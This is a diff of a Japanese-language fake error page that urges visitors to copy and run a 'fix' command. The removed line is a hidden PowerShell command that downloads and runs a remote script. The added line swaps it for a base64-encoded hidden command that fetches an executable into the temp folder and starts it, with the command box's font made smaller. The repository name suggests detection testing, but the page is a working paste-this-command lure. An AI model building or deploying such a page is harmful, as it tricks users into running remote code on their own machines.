@@ -7,7 +7,7 @@
         .container { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: auto; }
         .error { color: red; font-weight: bold; margin-bottom: 20px; }
         .fix-button { background: #0078d4; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
-        .command-box { background: #f5f5f5; padding: 15px; border: 1px solid #ccc; margin: 20px 0; font-family: monospace; word-break: break-all; }
+        .command-box { background: #f5f5f5; padding: 15px; border: 1px solid #ccc; margin: 20px 0; font-family: monospace; word-break: break-all; font-size: 11px; }
         .copied { color: green; margin-top: 10px; display: none; }
     </style>
 </head>
@@ -18,7 +18,7 @@
         <p>以下の修正コマンドを実行してください：</p>
         
         <div class="command-box" id="command">
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/choro511/detection-testing/main/runner.ps1')"
+powershell -w hidden -Enc aQB3AHIAIAAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYwBoAG8AcgBvADUAMQAxAC8AZABlAHQAZQBjAHQAaQBvAG4ALQB0AGUAcwB0AGkAbgBnAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAGMAYQBsAGMALgBlAHgAZQAnACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABjAGEAbABjAC4AZQB4AGUAOwAgAHMAdABhAHIAdAAgACQAZQBuAHYAOgBUAEUATQBQAFwAYwBhAGwAYwAuAGUAeABlAA==
         </div>
         
         <button class="fix-button" onclick="copyCommand()">修正コマンドをコピー</button>
